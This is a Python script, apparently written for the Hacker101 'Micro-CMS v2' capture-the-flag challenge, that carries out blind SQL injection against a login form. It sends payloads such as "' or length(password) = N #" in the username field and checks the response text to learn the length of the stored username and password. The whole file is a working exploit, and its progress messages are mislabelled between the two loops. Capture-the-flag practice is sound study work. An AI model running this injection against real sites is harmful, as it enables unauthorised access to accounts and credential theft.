# Made for Hacker101 CTF - Micro-CMS v2
# I'm not responsible for whatever you do with this
# Given a sqli injectable param, in this case: username, determines the length valid params on the back end

import requests

max_chars = 32 # Maximum length to try
password_length = None
username_length = None
response_dork = 'Invalid password' # Content in response to look for if sqli evaluates true
target_url = 'http://###.###.###.###/##########/login' 

print('Starting enumeration...')

for x in range(1,max_chars):
	length_dork = "' or length(password) = %s #" % x 
	data = {'username':length_dork,'password':'foo'}
	response = requests.post(target_url,data=data)
	if response_dork in response.text:
		password_length = x
		break

print('Username length enum loop completed')

for x in range(1,max_chars):
	length_dork = "' or length(username) = %s #" % x 
	data = {'username':length_dork,'password':'foo'}
	response = requests.post(target_url,data=data)
	if response_dork in response.text:
		username_length = x
		break

print('Password length enum loop completed')

if password_length != None and username_length != None:
	print('Successfully determined valid credential lengths!')
	print('Username is %s chars long' % username_length)
	print('Password is %s chars long' % password_length)
else:
	print('Could not determine username or password length. Double-check your script.')

